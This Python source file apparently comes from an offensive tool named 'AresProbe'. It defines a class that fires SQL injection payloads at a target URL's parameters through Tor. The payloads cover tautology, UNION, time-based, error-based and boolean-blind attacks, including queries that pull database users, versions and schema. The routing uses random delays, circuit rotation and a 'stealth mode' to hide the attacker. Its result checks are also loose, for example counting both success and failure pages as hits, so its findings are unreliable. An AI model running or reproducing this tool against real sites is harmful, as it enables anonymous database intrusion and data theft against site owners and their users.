"""
AresProbe Tor SQL Injector Integration
Advanced Tor integration for SQL injection attacks
"""

import asyncio
import aiohttp
import time
import random
from typing import Dict, List, Any, Optional, Tuple
from .advanced_tor_system import AdvancedTorSystem
from .tor_requests import TorRequests
from .sql_injector import SuperSQLInjector
from .advanced_database_support import DatabaseType

class TorSQLInjector:
    """Advanced Tor SQL Injector with 20+ options"""
    
    def __init__(self, tor_system: AdvancedTorSystem, logger=None):
        self.tor_system = tor_system
        self.logger = logger
        self.tor_requests = TorRequests(tor_system, logger)
        self.sql_injector = SuperSQLInjector(logger)
        self.attacks = []
        self.results = []
        
        # Tor-specific configuration
        self.circuit_rotation = True
        self.rotation_interval = 30
        self.max_retries = 3
        self.retry_delay = 5
        self.stealth_mode = True
        self.anonymity_level = "high"
        
        # Attack patterns
        self.attack_patterns = {
            'basic': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "') OR (1=1--",
                "') OR (1=1#",
                "') OR (1=1/*"
            ],
            'advanced': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT data FROM table_name--"
            ],
            'time_based': [
                "' OR SLEEP(5)--",
                "' OR SLEEP(10)--",
                "' OR SLEEP(15)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "'; WAITFOR DELAY '00:00:10'--",
                "'; WAITFOR DELAY '00:00:15'--",
                "' OR pg_sleep(5)--",
                "' OR pg_sleep(10)--",
                "' OR pg_sleep(15)--"
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(table_name,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(column_name,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            'boolean_blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a'--",
                "' AND 'a'='b'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>1--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>2--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>3--"
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT data FROM table_name--"
            ]
        }
        
        # Database-specific patterns
        self.database_patterns = {
            DatabaseType.MYSQL: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "') OR (1=1--",
                "') OR (1=1#",
                "') OR (1=1/*"
            ],
            DatabaseType.POSTGRESQL: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "') OR (1=1--",
                "') OR (1=1/*"
            ],
            DatabaseType.ORACLE: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "') OR (1=1--",
                "') OR (1=1/*"
            ],
            DatabaseType.SQLSERVER: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "') OR (1=1--",
                "') OR (1=1/*"
            ]
        }
    
    def start_tor_sql_injection(self, target_url: str, parameters: Dict[str, str], 
                              database_type: DatabaseType = DatabaseType.MYSQL) -> bool:
        """Start Tor SQL injection attack"""
        try:
            if not self.tor_system.is_running():
                if self.logger:
                    self.logger.error("[-] Tor system is not running")
                return False
            
            if self.logger:
                self.logger.success("[+] Starting Tor SQL injection attack")
                self.logger.success(f"[+] Target: {target_url}")
                self.logger.success(f"[+] Database: {database_type.value}")
                self.logger.success(f"[+] Parameters: {list(parameters.keys())}")
                self.logger.success(f"[+] Stealth mode: {self.stealth_mode}")
                self.logger.success(f"[+] Anonymity level: {self.anonymity_level}")
            
            # Test Tor connection
            if not self.tor_requests.test_connection():
                if self.logger:
                    self.logger.error("[-] Tor connection test failed")
                return False
            
            # Start injection attack
            return self._perform_injection_attack(target_url, parameters, database_type)
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] Tor SQL injection start failed: {e}")
            return False
    
    def _perform_injection_attack(self, target_url: str, parameters: Dict[str, str], 
                                database_type: DatabaseType) -> bool:
        """Perform SQL injection attack through Tor"""
        try:
            # Get attack patterns for database type
            patterns = self.database_patterns.get(database_type, self.attack_patterns['basic'])
            
            # Test each parameter
            for param_name, param_value in parameters.items():
                if self.logger:
                    self.logger.info(f"[*] Testing parameter: {param_name}")
                
                # Test basic injection
                if self._test_basic_injection(target_url, param_name, param_value, patterns):
                    if self.logger:
                        self.logger.success(f"[+] Basic injection found in parameter: {param_name}")
                
                # Test advanced injection
                if self._test_advanced_injection(target_url, param_name, param_value, database_type):
                    if self.logger:
                        self.logger.success(f"[+] Advanced injection found in parameter: {param_name}")
                
                # Test time-based injection
                if self._test_time_based_injection(target_url, param_name, param_value, database_type):
                    if self.logger:
                        self.logger.success(f"[+] Time-based injection found in parameter: {param_name}")
                
                # Test error-based injection
                if self._test_error_based_injection(target_url, param_name, param_value, database_type):
                    if self.logger:
                        self.logger.success(f"[+] Error-based injection found in parameter: {param_name}")
                
                # Test boolean blind injection
                if self._test_boolean_blind_injection(target_url, param_name, param_value, database_type):
                    if self.logger:
                        self.logger.success(f"[+] Boolean blind injection found in parameter: {param_name}")
                
                # Test union-based injection
                if self._test_union_based_injection(target_url, param_name, param_value, database_type):
                    if self.logger:
                        self.logger.success(f"[+] Union-based injection found in parameter: {param_name}")
                
                # Rotate circuit if enabled
                if self.circuit_rotation:
                    self._rotate_circuit()
            
            return True
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] Injection attack failed: {e}")
            return False
    
    def _test_basic_injection(self, target_url: str, param_name: str, param_value: str, 
                            patterns: List[str]) -> bool:
        """Test basic SQL injection"""
        try:
            for pattern in patterns:
                # Create test payload
                test_payload = param_value + pattern
                
                # Send request through Tor
                response = self.tor_requests.get(target_url, params={param_name: test_payload})
                
                # Check for injection indicators
                if self._check_injection_indicators(response, pattern):
                    return True
                
                # Delay between requests
                time.sleep(random.uniform(1, 3))
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Basic injection test failed: {e}")
            return False
    
    def _test_advanced_injection(self, target_url: str, param_name: str, param_value: str, 
                               database_type: DatabaseType) -> bool:
        """Test advanced SQL injection"""
        try:
            patterns = self.attack_patterns['advanced']
            
            for pattern in patterns:
                # Create test payload
                test_payload = param_value + pattern
                
                # Send request through Tor
                response = self.tor_requests.get(target_url, params={param_name: test_payload})
                
                # Check for injection indicators
                if self._check_injection_indicators(response, pattern):
                    return True
                
                # Delay between requests
                time.sleep(random.uniform(1, 3))
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Advanced injection test failed: {e}")
            return False
    
    def _test_time_based_injection(self, target_url: str, param_name: str, param_value: str, 
                                 database_type: DatabaseType) -> bool:
        """Test time-based SQL injection"""
        try:
            patterns = self.attack_patterns['time_based']
            
            for pattern in patterns:
                # Create test payload
                test_payload = param_value + pattern
                
                # Measure response time
                start_time = time.time()
                response = self.tor_requests.get(target_url, params={param_name: test_payload})
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # Check if response time indicates injection
                if response_time > 5:  # 5 seconds threshold
                    if self.logger:
                        self.logger.warning(f"[!] Time-based injection detected: {response_time:.2f}s")
                    return True
                
                # Delay between requests
                time.sleep(random.uniform(1, 3))
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Time-based injection test failed: {e}")
            return False
    
    def _test_error_based_injection(self, target_url: str, param_name: str, param_value: str, 
                                  database_type: DatabaseType) -> bool:
        """Test error-based SQL injection"""
        try:
            patterns = self.attack_patterns['error_based']
            
            for pattern in patterns:
                # Create test payload
                test_payload = param_value + pattern
                
                # Send request through Tor
                response = self.tor_requests.get(target_url, params={param_name: test_payload})
                
                # Check for error indicators
                if self._check_error_indicators(response, database_type):
                    return True
                
                # Delay between requests
                time.sleep(random.uniform(1, 3))
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Error-based injection test failed: {e}")
            return False
    
    def _test_boolean_blind_injection(self, target_url: str, param_name: str, param_value: str, 
                                    database_type: DatabaseType) -> bool:
        """Test boolean blind SQL injection"""
        try:
            patterns = self.attack_patterns['boolean_blind']
            
            for pattern in patterns:
                # Create test payload
                test_payload = param_value + pattern
                
                # Send request through Tor
                response = self.tor_requests.get(target_url, params={param_name: test_payload})
                
                # Check for boolean indicators
                if self._check_boolean_indicators(response, pattern):
                    return True
                
                # Delay between requests
                time.sleep(random.uniform(1, 3))
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Boolean blind injection test failed: {e}")
            return False
    
    def _test_union_based_injection(self, target_url: str, param_name: str, param_value: str, 
                                  database_type: DatabaseType) -> bool:
        """Test union-based SQL injection"""
        try:
            patterns = self.attack_patterns['union_based']
            
            for pattern in patterns:
                # Create test payload
                test_payload = param_value + pattern
                
                # Send request through Tor
                response = self.tor_requests.get(target_url, params={param_name: test_payload})
                
                # Check for union indicators
                if self._check_union_indicators(response, pattern):
                    return True
                
                # Delay between requests
                time.sleep(random.uniform(1, 3))
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Union-based injection test failed: {e}")
            return False
    
    def _check_injection_indicators(self, response, pattern: str) -> bool:
        """Check for SQL injection indicators in response"""
        try:
            content = response.text.lower()
            
            # Common injection indicators
            indicators = [
                'error', 'exception', 'fatal', 'warning', 'notice',
                'sql error', 'mysql error', 'postgresql error',
                'oracle error', 'sqlserver error', 'syntax error',
                'warning: mysql', 'fatal error', 'mysql_fetch_array',
                'mysql_num_rows', 'mysql_query', 'pg_query',
                'oci_execute', 'sqlsrv_query', 'odbc_exec'
            ]
            
            for indicator in indicators:
                if indicator in content:
                    return True
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Injection indicator check failed: {e}")
            return False
    
    def _check_error_indicators(self, response, database_type: DatabaseType) -> bool:
        """Check for error-based injection indicators"""
        try:
            content = response.text.lower()
            
            # Database-specific error patterns
            error_patterns = {
                DatabaseType.MYSQL: [
                    'mysql error', 'warning: mysql', 'mysql_fetch_array',
                    'mysql_num_rows', 'mysql_query', 'mysqli_connect',
                    'mysqli_query', 'mysqli_fetch_assoc'
                ],
                DatabaseType.POSTGRESQL: [
                    'postgresql error', 'pg_query', 'pg_fetch_array',
                    'pg_connect', 'psql error', 'postgres error'
                ],
                DatabaseType.ORACLE: [
                    'oracle error', 'oci_execute', 'oci_connect',
                    'oci_fetch_array', 'ora-', 'oracle database'
                ],
                DatabaseType.SQLSERVER: [
                    'sql server error', 'microsoft ole db provider',
                    'odbc sql server driver', 'sqlsrv_query',
                    'sqlsrv_connect', 'sqlsrv_fetch_array'
                ]
            }
            
            patterns = error_patterns.get(database_type, [])
            
            for pattern in patterns:
                if pattern in content:
                    return True
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Error indicator check failed: {e}")
            return False
    
    def _check_boolean_indicators(self, response, pattern: str) -> bool:
        """Check for boolean blind injection indicators"""
        try:
            content = response.text.lower()
            
            # Boolean indicators
            true_indicators = [
                'welcome', 'success', 'valid', 'authenticated',
                'authorized', 'admin', 'user', 'profile', 'dashboard'
            ]
            
            false_indicators = [
                'error', 'invalid', 'failed', 'denied', 'forbidden',
                'unauthorized', 'access denied', 'login failed'
            ]
            
            # Check for true indicators
            for indicator in true_indicators:
                if indicator in content:
                    return True
            
            # Check for false indicators
            for indicator in false_indicators:
                if indicator in content:
                    return True
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Boolean indicator check failed: {e}")
            return False
    
    def _check_union_indicators(self, response, pattern: str) -> bool:
        """Check for union-based injection indicators"""
        try:
            content = response.text.lower()
            
            # Union indicators
            union_indicators = [
                'union', 'select', 'from', 'where', 'order by',
                'group by', 'having', 'limit', 'offset'
            ]
            
            for indicator in union_indicators:
                if indicator in content:
                    return True
            
            return False
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Union indicator check failed: {e}")
            return False
    
    def _rotate_circuit(self):
        """Rotate Tor circuit"""
        try:
            if self.circuit_rotation:
                self.tor_requests._rotate_circuit()
                if self.logger:
                    self.logger.info("[*] Tor circuit rotated")
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Circuit rotation failed: {e}")
    
    def set_stealth_mode(self, enabled: bool):
        """Set stealth mode"""
        self.stealth_mode = enabled
        if self.logger:
            self.logger.info(f"[*] Stealth mode: {'enabled' if enabled else 'disabled'}")
    
    def set_anonymity_level(self, level: str):
        """Set anonymity level"""
        self.anonymity_level = level
        if self.logger:
            self.logger.info(f"[*] Anonymity level set to: {level}")
    
    def set_rotation_interval(self, interval: int):
        """Set circuit rotation interval"""
        self.rotation_interval = interval
        self.tor_requests.set_rotation_interval(interval)
        if self.logger:
            self.logger.info(f"[*] Rotation interval set to: {interval} seconds")
    
    def enable_circuit_rotation(self):
        """Enable circuit rotation"""
        self.circuit_rotation = True
        self.tor_requests.enable_rotation()
        if self.logger:
            self.logger.info("[*] Circuit rotation enabled")
    
    def disable_circuit_rotation(self):
        """Disable circuit rotation"""
        self.circuit_rotation = False
        self.tor_requests.disable_rotation()
        if self.logger:
            self.logger.info("[*] Circuit rotation disabled")
    
    def get_attacks(self) -> List[Dict[str, Any]]:
        """Get attack results"""
        return self.attacks
    
    def get_results(self) -> List[Dict[str, Any]]:
        """Get injection results"""
        return self.results
    
    def clear_results(self):
        """Clear results"""
        self.attacks.clear()
        self.results.clear()
        if self.logger:
            self.logger.info("[*] Results cleared")
